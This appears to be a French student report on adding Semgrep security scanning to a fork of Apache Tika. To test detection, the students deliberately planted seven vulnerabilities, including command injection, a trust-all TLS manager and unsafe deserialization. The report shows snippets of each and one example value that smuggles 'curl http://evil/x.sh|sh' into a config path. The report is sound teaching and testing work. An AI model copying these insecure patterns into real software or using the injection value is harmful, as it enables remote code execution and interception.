# Tâche 3

Binôme : BEAULIEU et DONG\
Dépôt du cas d'étude (Tika) : https://github.com/jeannicbeaulieu/tika\
Workflow modifié : https://github.com/jeannicbeaulieu/tika/blob/tache3/.github/workflows/main-jdk17-build.yml

## 1. Workflow GitHub Actions

### Ce qu'on a modifié

Le workflow main jdk17 build vérifie automatiquement le code chaque fois que quelqu'un pousse des modifications ou ouvre une PR sur tache3 ou main.

Il fait trois choses :

1. build — Vérifie que le projet compile correctement, que les licences sont conformes, que les tests unitaires passent et que la documentation peut être générée.
    - "Readme.md" excluded so that the build runs"

2. e2e-tests — Exécute les tests qui vérifient que les différentes parties du projet fonctionnent correctement ensemble. Il commence seulement si build réussit.

3. semgrep — Recherche les failles de sécurité dans le code Java. Il compare les résultats avec une version de référence pour détecter uniquement les nouvelles vulnérabilités, plutôt que de signaler celles qui existaient déjà.

### Pourquoi ces choix

Semgrep est lancé avec --baseline-commit qui pointe vers le commit précédent. Semgrep compare le code actuel avec le code du commit précédent. Il signale seulement les problèmes de sécurité qui viennent d'être introduits.
On utilise des règles de sécurité Java provenant du dépôt officiel de Semgrep. on vérifie le code Java avec un ensemble stable de règles de sécurité.
- On utilise uniquement les règles liées à la sécurité Java.
- On fixe une version précise des règles et de Semgrep pour obtenir des résultats cohérents à chaque exécution.
Le flag --error fait échouer le build dès que Semgrep trouve au moins un problème.
L'objectif : empêcher l'ajout de nouveaux problèmes de sécurité sans avoir à corriger immédiatement toutes les vulnérabilités déjà présentes dans le projet.

### Comment on l'a validé

On a testé le workflow dans trois situations :
- Commit propre : on a envoyé une modification de code, sans nouvelle vulnérabilité. Semgrep ne trouve aucun finding nouveau, exit 0, le job build démarre normalement.
- Commit avec vulnérabilités : on a ajouté du code présentant un problème de sécurité (7 vulnérabilités). Semgrep détecte 7 nouveaux findings, exit 1, le job build est bloqué et n'est jamais lancé, le workflow échoue.
- Cas limite (si testé) : on vérifie qu'une vulnérabilité déjà présente dans le code avant notre modification ne fait pas échouer le workflow.

- Commit propre : https://github.com/jeannicbeaulieu/tika/actions/runs/43507081560
- Commit avec vulnérabilité : https://github.com/jeannicbeaulieu/tika/actions/runs/43639075652

## 2. Vulnérabilités introduites

Liste rapide :

1. Injection de commande OS (CWE-78) dans `TesseractOCRParser.java`
2. Aléa non cryptographique (CWE-330) dans `TemporaryResources.java`
3. Permissions de fichier trop larges (CWE-732) dans `TemporaryResources.java`
4. Validation de certificat TLS désactivée (CWE-295) dans `NetworkParser.java`
5. Désérialisation de données non fiables (CWE-502) dans `JsonMetadata.java`
6. Hachage cassé MD5 (CWE-328) dans `PDMetadataExtractor.java`
7. Entités externes XML, XXE (CWE-611) dans `AbstractOOXMLExtractor.java`


### 2.1 Injection de commande (CWE-78)

**Fichier :** `tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-ocr-module/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java`, méthode `preloadLangs()`
**Pourquoi ce fichier :** le parseur OCR est l'un des rares endroits où Tika lance un programme externe
(`tesseract`). Tika y a déjà eu une vraie faille de ce type..

Code avant :

```java
String[] args = new String[]{defaultConfig.getTesseractPath() + getTesseractProg(), "--list-langs"};
ProcessBuilder pb = new ProcessBuilder(args);
setEnv(pb);
...
process = pb.start();
```

Code après :

```java
String cmd = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
...
process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
```

**Pourquoi c'est vulnérable :** avant, le programme était lancé directement avec un tableau d'arguments, sans shell.
Maintenant, le chemin de Tesseract, qui vient de la configuration, est concaténé dans une ligne de commande
interprétée par `sh -c`. Une valeur comme `tesseractPath = "/tmp/;curl http://evil/x.sh|sh;"` fait exécuter des
commandes arbitraires avec les droits du processus Tika.

**Résultat Semgrep :** règle `java.lang.security.audit.command-injection-formatted-runtime-call`, ERROR, ligne 736.

```text
A formatted or concatenated string was detected as input to a java.lang.Runtime call.
This is dangerous if a variable is controlled by user input and could result in a
command injection.
```

### 2.2 Aléa non cryptographique (CWE-330)

**Fichier :** `tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java`, nouvelle méthode `createSharedTempFile(String suffix)`
**Pourquoi ce fichier :** `TemporaryResources` est la classe qui crée les fichiers temporaires dans lesquels Tika
copie les documents à analyser ; une méthode « fichier temporaire partagé avec un programme externe » y est naturelle.

Code avant : la méthode n'existait pas (on utilisait `Files.createTempFile`, qui choisit un nom avec `SecureRandom`).

Code après :

```java
String name = "apache-tika-shared-" + Long.toHexString(new Random().nextLong()) + actualSuffix;
final Path path = Files.createFile(dir.resolve(name));
```

**Pourquoi c'est vulnérable :** `java.util.Random` est un générateur prévisible : on peut retrouver sa graine à
partir de quelques valeurs, et par défaut elle dépend de l'horloge. Dans le dossier temporaire partagé (`/tmp`), un
autre utilisateur de la machine peut deviner le nom et créer ce fichier, ou un lien symbolique, avant Tika : déni de
service (`FileAlreadyExistsException`) ou détournement du fichier.

**Résultat Semgrep :** règle `java.lang.security.audit.crypto.weak-random`, WARNING, ligne 126.

```text
Detected use of the functions `Math.random()` or `java.util.Random()`. These are both
not cryptographically strong random number generators (RNGs).
```

### 2.3 Permissions de fichier trop larges (CWE-732)

**Fichier :** `tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java`, même méthode `createSharedTempFile`
**Pourquoi ce fichier :** même endroit. 2.2 et 2.3 sont deux défauts distincts. Ensemble, ils forment le cas du fichier temporaire non sécurisé.

Code avant : la méthode n'existait pas (`Files.createTempFile` crée des fichiers `rw-------`, lisibles seulement par
leur propriétaire).

Code après :

```java
Files.setPosixFilePermissions(path, PosixFilePermissions.fromString("rw-rw-rw-"));
```

**Pourquoi c'est vulnérable :** le fichier contient le document en cours d'analyse, souvent confidentiel. Avec
`rw-rw-rw-`, tout utilisateur de la machine peut le lire et le modifier entre l'écriture et l'analyse, ce qui fausse le résultat de Tika.

**Résultat Semgrep :** règle `java.lang.security.audit.overly-permissive-file-permission`, WARNING, ligne 131
(Semgrep la classe sous CWE-276, *Incorrect Default Permissions*, une variante de CWE-732).

```text
Detected file permissions that are overly permissive (read, write, and execute).
It is generally a bad practices to set overly permissive file permission such as
read+write+exec for all users.
```

### 2.4 Validation de certificat TLS désactivée (CWE-295)

**Fichier :** `tika-core/src/main/java/org/apache/tika/parser/NetworkParser.java`
**Pourquoi ce fichier :** `NetworkParser` envoie le document à un serveur d'analyse distant et lit la réponse.
C'est le seul parseur de `tika-core` qui communique par le réseau.

Code avant :

```java
URLConnection connection = url.openConnection();
connection.setDoOutput(true);
```

Code après :

```java
URLConnection connection = url.openConnection();
if (connection instanceof HttpsURLConnection) {
    // accept self-signed certificates of internal parsing servers
    ((HttpsURLConnection) connection).setSSLSocketFactory(trustAllSslContext().getSocketFactory());
}
connection.setDoOutput(true);
...
new X509TrustManager() {
    public void checkClientTrusted(X509Certificate[] chain, String authType) { }
    public void checkServerTrusted(X509Certificate[] chain, String authType) { }
    public X509Certificate[] getAcceptedIssuers() { return null; }
}
```

**Pourquoi c'est vulnérable :** `checkServerTrusted` est vide, donc il accepte n'importe quel certificat, même un
certificat autosigné présenté par un attaquant. HTTPS n'authentifie plus le serveur. Un attaquant placé entre Tika
et le serveur peut lire les documents envoyés et renvoyer un contenu falsifié que Tika présentera comme le résultat de l'analyse.

**Résultat Semgrep :** règle `java.lang.security.audit.crypto.ssl.insecure-trust-manager`, WARNING, lignes 106, 110
et 114 (un résultat par méthode).

```text
Detected empty trust manager implementations. This is dangerous because it accepts
any certificate, enabling man-in-the-middle attacks.
```

### 2.5 Désérialisation non sécurisée (CWE-502)

**Fichier :** `tika-serialization/src/main/java/org/apache/tika/serialization/JsonMetadata.java`, nouvelle méthode `fromJavaSerialized(InputStream)`
**Pourquoi ce fichier :** le module `tika-serialization` sert justement à sérialiser et désérialiser les
`Metadata`. Une méthode pour lire un « ancien format » Java y est plausible.

Code avant : la méthode n'existait pas.

Code après :

```java
ObjectInputStream ois = new ObjectInputStream(stream);
return (Metadata) ois.readObject();
```

**Pourquoi c'est vulnérable :** `readObject()` recrée n'importe quelle classe sérialisable présente dans le classpath et exécute ses méthodes `readObject`/`readResolve` avant la conversion en `Metadata`. Le classpath de Tika est très gros alors un flux piégé avec une chaîne de gadgets peut mener à une exécution de code à distance, ou au moins à un déni de service. Il faudrait garder le JSON, ou ajouter un `ObjectInputFilter` qui n'accepte que les classes attendues.

**Résultat Semgrep :** règle `java.lang.security.audit.object-deserialization`, WARNING, ligne 144.

```text
Found object deserialization using ObjectInputStream. Deserializing entire Java objects
is dangerous because malicious actors can create Java object streams with unintended
consequences.
```

### 2.6 Hachage cassé MD5 (CWE-328)

**Fichier :** `tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-pdf-module/src/main/java/org/apache/tika/parser/pdf/PDMetadataExtractor.java`, nouvelle méthode `fingerprintXmp(byte[])`
**Pourquoi ce fichier :** cette classe extrait les métadonnées XMP des PDF, une empreinte servant à vérifier si le
XMP a été modifié entre deux mises à jour du PDF y a sa place.

Code avant : la méthode n'existait pas.

Code après :

```java
MessageDigest digest = MessageDigest.getInstance("MD5");
return HexFormat.of().formatHex(digest.digest(xmp));
```

**Pourquoi c'est vulnérable :** MD5 n'est plus résistant aux collisions : on sait fabriquer en quelques secondes deux contenus différents qui ont la même empreinte. Utilisée comme contrôle d'intégrité, cette empreinte permet de faire passer un XMP modifié pour l'original. Il faudrait au minimum SHA-256.

**Résultat Semgrep :** règle `java.lang.security.audit.crypto.use-of-md5`, WARNING, ligne 91 (Semgrep propose même
un correctif automatique vers `SHA-512`).

```text
Detected MD5 hash algorithm which is considered insecure. MD5 is not collision
resistant and is therefore not suitable as a cryptographic signature.
```

### 2.7

## 3. Comparaison des rapports Semgrep

### Comment on a comparé

Les deux rapports utilisent exactement les mêmes règles (`p/java` et `p/security-audit`) et excluent les tests. Le rapport « avant » est généré sur la branche `main` (code non modifié), le rapport « après » sur la branche `tache3` (avec nos 7 vulnérabilités).

```bash
# sur main
semgrep scan --config p/java --config p/security-audit --metrics=off \
  --json -o before.json --exclude '**/src/test/**' .

# sur tache3
semgrep scan --config p/java --config p/security-audit --metrics=off \
  --json -o after.json --exclude '**/src/test/**' .
```

Pour faire la différence, on compte les résultats par couple (règle, fichier) dans chaque rapport, puis on compare. On n'utilise pas le texte du code ni le numéro de ligne : le premier est masqué (« requires login ») dans la version gratuite, et le second change dès qu'on modifie un fichier.

```bash
for f in before after; do
  jq -r '.results[]|[.check_id,.path]|@tsv' $f.json | sort | uniq -c > $f.cnt
done
diff before.cnt after.cnt | grep '^>'
```

### Ce qu'on constate

Avant : **19** résultats. Après : **30** résultats, donc **11 de plus**.

Les nouveaux résultats correspondent à nos vulnérabilités :

| # | Vulnérabilité | Règle Semgrep | Fichier | Résultats |
|---|---|---|---|---|
| 1 | Injection de commande OS (CWE-78) | `command-injection-formatted-runtime-call` | `TesseractOCRParser.java` | 1 |
| 2 | Aléa non cryptographique (CWE-330) | `weak-random` | `TemporaryResources.java` | 1 |
| 3 | Permissions de fichier trop larges (CWE-732) | `overly-permissive-file-permission` | `TemporaryResources.java` | 1 |
| 4 | Validation de certificat TLS désactivée (CWE-295) | `insecure-trust-manager` | `NetworkParser.java` | 3 |
| 5 | Désérialisation de données non fiables (CWE-502) | `object-deserialization` | `JsonMetadata.java` | 1 |
| 6 | Hachage cassé MD5 (CWE-328) | `use-of-md5` | `PDMetadataExtractor.java` | 1 |
| 7 | Entités externes XML, XXE (CWE-611) | `documentbuilderfactory-disallow-doctype-decl-missing` | `AbstractOOXMLExtractor.java` | 1 |

Les 7 vulnérabilités ont été détectées, chacune par une règle distincte.

Résultats supplémentaires :

- La vulnérabilité 4 produit 3 résultats au lieu d'un : la règle se déclenche pour chacune des méthodes de notre `X509TrustManager` (`checkClientTrusted`, `checkServerTrusted`, `getAcceptedIssuers`).
- Deux résultats inattendus apparaissent dans `.github/actions/rickroll/rickroll.py` : `dynamic-urllib-use-detected` et `use-defused-xml`. Ce ne sont pas des vulnérabilités ajoutées volontairement : le script ne lit que les rapports XML de notre propre build (source sûre) et n'appelle l'API GitHub qu'avec des paramètres entièrement contrôlés. Nous les avons supprimés avec `# nosemgrep` accompagné d'une justification directement dans le code.
- Les 19 résultats existants ne changent pas : ils étaient déjà dans le code d'origine.

## 4. Rickroll

### Action utilisée

Nous avons développé notre propre action GitHub (`./.github/actions/rickroll`), écrite en Python. Elle scanne les
rapports JUnit XML générés par Surefire, identifie les tests en échec et publie :
- une annotation d'erreur dans la CI avec le lien vers la vidéo ;
- un résumé de job avec la liste des tests en échec et le GIF classique ;
- un commentaire sur la PR (si le workflow tourne dans ce contexte).

Nous avons préféré une action maison à un fork de `TejasvOnly/random-rickroll` pour plusieurs raisons :
- Contrôle total du comportement (texte, GIF, probabilité de déclenchement configurable).
- Intégration naturelle avec l'écosystème Surefire/Maven de Tika : l'action lit les rapports JUnit XML et liste les tests en échec dans le message.
- Pas de dépendance à un dépôt tiers qui pourrait disparaître ou être compromis.

Lien : [`.github/actions/rickroll/`](https://github.com/jeannicbeaulieu/tika/tree/tache3/.github/actions/rickroll)

### Intégration dans le workflow

Le rickroll est déclenché dans les deux jobs qui exécutent des tests (`build` et `e2e-tests`) :

```yaml
- name: Rickroll if a test failed
  if: failure()
  uses: ./.github/actions/rickroll
  with:
    percentage: '100'
```

Le workflow expose aussi un déclencheur `workflow_dispatch` avec l'entrée `rickroll_demo: true` qui force
l'échec de `RickrollDemoTest.java` pour démontrer le mécanisme sans avoir à casser du vrai code.

### Validation

Le rickroll a été validé par déclenchement manuel (`workflow_dispatch` avec `rickroll_demo: true`), qui fait
échouer `RickrollDemoTest.testFailsOnlyInRickrollDemo`. L'annotation d'erreur et le résumé de job apparaissent
dans la CI.

- Exécution avec test en échec (rickroll déclenché) : https://github.com/jeannicbeaulieu/tika/actions/runs/43639075652

## 5. Limites

(Ce qui ne marche pas parfaitement : faux négatifs de Semgrep, temps d'exécution, façons de contourner la vérification, etc.)

## 6. Déclaration d'utilisation de l'IA
